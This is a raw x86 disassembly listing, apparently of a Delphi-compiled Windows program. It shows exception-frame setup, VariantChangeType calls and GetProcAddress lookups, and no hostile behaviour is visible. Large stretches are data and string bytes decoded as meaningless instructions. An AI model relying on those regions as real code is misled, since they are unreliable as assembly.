add [ eax ] al
add ah bl
and [ eax ] ecx
dec eax
add [ edi + esi ] ah
dec eax
add [ eax ] al
add [ eax ] al
add al dh
and [ eax ] ecx
or [ edx ] bh
dec eax
add [ eax ] al
add [ eax ] al
add ah ch
and [ eax ] ecx
hlt
sub_40d795
xor eax 0x48
add [ eax ] al
fsub [ ecx ]
dec eax
add al dh
cmp [ eax ] ecx
add [ eax ] al
add [ eax ] al
aam 0x21
dec eax
add [ eax + 0x4838 ] bl
add [ eax ] al
add al dl
and [ eax ] ecx
adc [ edi ] dh
dec eax
add [ eax ] al
add [ eax ] al
add ah cl
and [ eax ] ecx
pop eax
cmp [ eax ] cl
add [ eax ] al
add [ eax ] al
enter 0x4821 0x0
add al 0x39
dec eax
add [ eax ] al
add [ eax ] al
add ah al
and [ eax ] ecx
js r-xdata
dec eax
add [ eax + 0x3a ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x38dc0048 ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffb7df ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x359c0048 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x44004821 ] ah
cmp cl [ eax ]
add [ eax ] al
add [ eax ] al
pushfd
and [ eax ] ecx
movsb [ edi ] [ esi ]
cmp ecx [ eax ]
add [ eax ] al
add [ eax ] al
cwde
and [ eax ] ecx
or al 0x36
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x35740048 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x6bffb7df ] dl
cmp cl [ eax ]
add [ eax ] al
add [ eax ] al
mov [ ecx ] fs
dec eax
add al bl
cmp [ eax ] cl
add [ eax ] al
add [ eax ] al
mov [ ecx ] ah
dec eax
add [ eax ] dh
cmp ecx [ eax ]
add [ eax ] al
add [ eax ] al
and [ fs : eax ] ecx
aam 0x37
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] ah
dec eax
add al cl
dec eax
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40da25
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add al al
and [ eax ] ecx
aaa
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x35880048 ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffb7df ] bh
aaa
dec eax
add [ eax ] al
add [ eax ] al
add [ ecx + 0x3ad80048 ] dh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x58004821 ] dh
cmp cl [ eax ]
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
and [ eax ] ecx
fdivr [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da2c
retn
mov eax rw-data
call sub_40d490
call sub_40cffc
call sub_40c27c
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40bd54 ]
call sub_404c00
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
call sub_404164
mov eax rw-data
mov edx [ r-xdata ]
call sub_40544c
mov eax rw-data
mov edx [ r-xdata ]
call sub_40544c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404164
mov eax rw-data
call sub_404844
mov eax rw-data
call sub_404164
sub_40da30
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40da98
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da9f
retn
mov eax sub_40d5e0
call sub_403e8c
mov eax r-xdata
call sub_403eb4
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c1f8
call sub_40c2fc
call sub_40d01c
call sub_40cbb4
mov eax rw-data
mov edx r-xdata
call sub_4041b8
sub_40dad0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40db24
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db7e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043ec
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4084e0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db85
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40db90
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dbea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043ec
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40986c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbf1
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40dbfc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc56
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043ec
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409840
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc5d
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40dc68
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dcc2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043ec
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b2a8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcc9
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40dcd4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dd2e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4043ec
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409898
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd35
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40dd40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40ddad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4043ec
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4085ec
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddb4
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_40ddc0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40de20
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4097f4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404990
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de27
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40de30
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40de90
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40aa20
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404990
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de97
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40dea0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40df04
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408688
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404990
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df0b
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_40df34
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40df60
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40dad0
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db00
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db00
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db0c
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db18
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db24
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db90
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbfc
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc68
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dcd4
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd40
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40ddc0
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de30
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dea0
mov eax r-xdata
call sub_40df34
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e26c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e291
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e298
retn
sub_40e3cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xe4
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ eax + 0x4035 ] ah
outsb
jbe r-xdata
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] al
inc eax
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
in eax 0x40
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
in eax 0x40
outsd
jb r-xdata
inc eax
in eax 0x40
inc ebx
popad
jb r-xdata
js r-xdata
adc eax 0x72615645
jns r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax + 0x4035 ] ah
outsb
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax - 0x1b ] 0x40
rcr ah 0xe4
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
inc eax
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1c ] bh
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
test al 0x35
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
in al 0x40
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
add [ eax ] al
lea eax [ eax ]
adc al 0xe4
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] dl
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xe6
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
outsd
jb r-xdata
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0040 ] ah
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
add [ ebp + esi + 0x35a80040 ] ah
jb r-xdata
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
jb r-xdata
outsb
je r-xdata
popad
shr [ esi + 0x40 ] 0x0
add [ eax ] al
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x72615645 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
out 0x40 al
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or dh ah
inc eax
outsd
jb r-xdata
add [ ebx ] dh
inc eax
add [ ebx + esi ] bl
outsd
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + 0x40e7 ] ah
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
insd
inc eax
add [ ebp + esi + 0x35a00040 ] ch
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ eax + 0x33 ] bl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor eax 0x33000040
inc eax
add [ ebx + esi ] bl
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
add [ edi ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bh
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
outsd
jb r-xdata
jbe r-xdata
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
insb
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ eax ] cl
call sub_40e802
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
call 0x4ce822
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add ah dl
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
out 0x40 al
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
dec esi
jne r-xdata
push 0x6f727245
jb r-xdata
retn
popad
outsb
je r-xdata
add [ eax ] al
enter 0x40e3 0x0
cwde
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shr al 0x1
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
mov esp 0x9800407b
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 + 0x40 ] ch
add [ eax + eax ] cl
inc ebp
jb r-xdata
jae r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e7 ] ah
add [ eax ] al
add [ ebx + edi * 2 + 0x35980040 ] bh
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
outsd
iretd
outsd
jb r-xdata
call 0xffffffff8c2536dd
mov ebx eax
xor eax eax
push ebp
push sub_40e9cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4140bc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4140bc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
call sub_403b1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e9d6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404188
retn
insb
dec edi
jo r-xdata
rcl al 0xe8
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_404164
retn
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
call 0x4ce8ea
call sub_40e866
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
call 0x4ce886
add [ eax ] al
add [ eax ] al
outsd
popad
popad
jns r-xdata
add [ ebp + 0x2fe8fc45 ] cl
pop eax
jb r-xdata
sub_40e802
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jae r-xdata
popad
outsb
je r-xdata
outsd
jb r-xdata
popad
add [ eax + 0x33 ] bl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
push 0x6f727245
jb r-xdata
dec esi
jne r-xdata
jbe r-xdata
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
rcl al 0xe8
call 0xffffffff8c2536dd
mov ebx eax
xor eax eax
push ebp
push sub_40e9cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4140bc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4140bc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
